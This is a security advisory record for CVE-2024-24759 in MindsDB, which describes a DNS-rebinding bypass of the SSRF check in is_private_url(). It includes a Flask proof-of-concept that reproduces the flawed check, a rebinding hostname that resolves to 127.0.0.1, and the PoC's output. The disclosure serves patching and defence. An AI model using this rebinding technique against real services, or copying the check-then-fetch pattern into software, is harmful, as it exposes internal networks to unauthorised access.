advisory_id: GHSA-4jcv-vp96-94xr
datasource_id: github_osv_importer_v2/GHSA-4jcv-vp96-94xr
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-4jcv-vp96-94xr/GHSA-4jcv-vp96-94xr.json
aliases:
  - CVE-2024-24759
summary: "MindsDB Vulnerable to Bypass of SSRF Protection with DNS Rebinding\n### Summary\n\n\
  DNS rebinding is a method of manipulating resolution of domain names to let the initial DNS\
  \ query hits an address and the second hits another one. For instance the host `make-190.119.176.200-rebind-127.0.0.1-rr.1u.ms`\
  \  would be initially resolved to `190.119.176.200` and the next DNS issue to `127.0.0.1`.\
  \ Please notice the following in the latest codebase:\n\n```python\ndef is_private_url(url:\
  \ str):\n    \"\"\"\n    Raises exception if url is private\n\n    :param url: url to check\n\
  \    \"\"\"\n\n    hostname = urlparse(url).hostname\n    if not hostname:\n        # Unable\
  \ to find hostname in url\n        return True\n    ip = socket.gethostbyname(hostname)\n\
  \    return ipaddress.ip_address(ip).is_private\n\n``` \n\nAs you can see, during the call\
  \ to `is_private_url()` the initial DNS query would be issued by `ip = socket.gethostbyname(hostname)`\
  \ to an IP (public one) and then due to DNS Rebinding, the next GET request would goes to\
  \ the private one.\n\n### PoC\n\n```python\nfrom flask import Flask, request, jsonify\nfrom\
  \ urllib.parse import urlparse\nimport socket\nimport ipaddress\nimport requests\n\napp =\
  \ Flask(__name__)\n\n\ndef is_private_url(url: str):\n    \"\"\"\n    Raises exception if\
  \ url is private\n\n    :param url: url to check\n    \"\"\"\n\n    hostname = urlparse(url).hostname\n\
  \    if not hostname:\n        # Unable to find hostname in url\n        return True\n   \
  \ ip = socket.gethostbyname(hostname)\n    if ipaddress.ip_address(ip).is_private:\n     \
  \   raise Exception(f\"Private IP address found for {url}\")\n\n\n@app.route(\"/\", methods=[\"\
  GET\"])\ndef index():\n    return \"http://127.0.0.1:5000/check_private_url?url=https://www.google.Fr\"\
  \n\n\n@app.route(\"/check_private_url\", methods=[\"GET\"])\ndef check_private_url():\n  \
  \  url = request.args.get(\"url\")\n\n    if not url:\n        return jsonify({\"error\":\
  \ 'Missing \"url\" parameter'}), 400\n\n    try:\n        is_private_url(url)\n        response\
  \ = requests.get(url)\n\n        return jsonify(\n            {\n                \"url\":\
  \ url,\n                \"is_private\": False,\n                \"text\": response.text,\n\
  \                \"status_code\": response.status_code,\n            }\n        )\n    except\
  \ Exception as e:\n        return jsonify({\"url\": url, \"is_private\": True, \"error\":\
  \ str(e)})\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n\n```\n\nAfter running\
  \ the poc.py with flask installed, consider visiting the following URLs:\n\n1. http://127.0.0.1:5000/check_private_url?url=https://www.example.com\
  \ since it is in the public space, you would get `is_private: false` and the GET request would\
  \ be issued to the www.Example.com website.\n3. http://127.0.0.1:5000/check_private_url?url=http://localhost:8667,\
  \ this one the address is private, you would get `is_private: true`\n4. http://127.0.0.1:5000/check_private_url?url=http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/\
  \ But this one, it initially returns the public IP `190.119.176.214` and then DNS rebind into\
  \ the network location `127.0.0.1:8667`.\n\nI set up a simple HTTP server at `127.0.0.1:8667`,\
  \ you can notice the results of the PoC in the next screenshot:\n\n```\n{\n  \"is_private\"\
  : false,\n  \"status_code\": 200,\n  \"text\": \"<pre>\\n<a href=\\\"poc.py\\\">poc.py</a>\\\
  n</pre>\\n\",\n  \"url\": \"http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/\"\n\
  }\n\n```\n\n\n### Impact\n - Bypass the SSRF protection on the whole website with DNS Rebinding.\n\
  \ - DoS too."
impacted_packages:
  - purl: pkg:pypi/mindsdb
    affected_versions: vers:pypi/<23.12.4.2
    fixed_versions: vers:pypi/23.12.4.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-4jcv-vp96-94xr/GHSA-4jcv-vp96-94xr.json
  - score: '7.8'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-4jcv-vp96-94xr/GHSA-4jcv-vp96-94xr.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-918
  - CWE-350
references:
  - url: https://github.com/mindsdb/mindsdb
    reference_type:
    reference_id:
  - url: https://github.com/mindsdb/mindsdb/commit/5f7496481bd3db1d06a2d2e62c0dce960a1fe12b
    reference_type:
    reference_id:
  - url: https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4jcv-vp96-94xr
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-24759
    reference_type:
    reference_id: CVE-2024-24759
